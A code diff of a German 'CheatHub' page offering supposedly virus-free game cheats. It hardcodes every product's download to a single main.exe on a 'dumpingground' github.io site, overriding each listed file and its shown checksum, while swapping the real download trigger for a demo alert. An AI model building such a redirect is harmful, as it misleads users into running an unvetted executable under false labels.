@@ -844,11 +844,11 @@
             <h1>CheatHub – Hochqualitative, virenfreie Cheats</h1>
             <p>Deine vertrauenswürdige Quelle für sichere, kostenlose und community-geprüfte Gaming-Tools. Auf Spendenbasis, von der Community für die Community.</p>
             <div class="cta-buttons">
-                <a href="https://blockhunter0007.github.io/cheathubdumpingground/main.exe" class="btn btn-primary" download="main.exe">
-                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/>
-                  </svg>
-                  Zu den Downloads
+                <a href="#downloads" class="btn btn-primary">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/>
+                    </svg>
+                    Zu den Downloads
                 </a>
                 <a href="#community" class="btn btn-secondary">
                     Community beitreten
@@ -1376,7 +1376,7 @@
                         <strong>SHA256:</strong> ${product.sha256}
                     </div>
                     <div class="product-actions">
-                        <button class="btn-download" data-download="main.exe" data-name="${product.name}">
+                        <button class="btn-download" data-download="${product.download}" data-name="${product.name}">
                             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; margin-right: 0.5rem;">
                                 <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/>
                             </svg>
@@ -1389,7 +1389,7 @@
             // Add download event listener
             const downloadBtn = card.querySelector('.btn-download');
             downloadBtn.addEventListener('click', () => {
-                showDownloadModal('main.exe', product.name);
+                showDownloadModal(product.download, product.name);
             });
             
             return card;
@@ -1403,7 +1403,8 @@
         const confirmRisks = document.getElementById('confirmRisks');
         
         function showDownloadModal(downloadUrl, productName) {
-            currentDownloadUrl = downloadUrl;
+            //currentDownloadUrl = downloadUrl;
+            currentDownloadUrl = "https://blockhunter0007.github.io/cheathubdumpingground/main.exe";
             downloadModal.classList.add('active');
             document.body.style.overflow = 'hidden';
             confirmRisks.checked = false;
@@ -1425,13 +1426,8 @@
         
         modalConfirm.addEventListener('click', () => {
             if (confirmRisks.checked && currentDownloadUrl) {
-                // Trigger the actual download of main.exe
-                const link = document.createElement('a');
-                link.href = currentDownloadUrl;
-                link.download = currentDownloadUrl; // Ensures it downloads as main.exe
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
+                // In a real implementation, this would trigger the actual download
+                alert(`Download würde jetzt starten: ${currentDownloadUrl}\n\nHinweis: Dies ist eine Demo. In der finalen Version würde hier der echte Download beginnen.`);
                 hideDownloadModal();
             }
         });
@@ -1487,4 +1483,4 @@
         });
     </script>
 </body>
-</html>
+    </html>
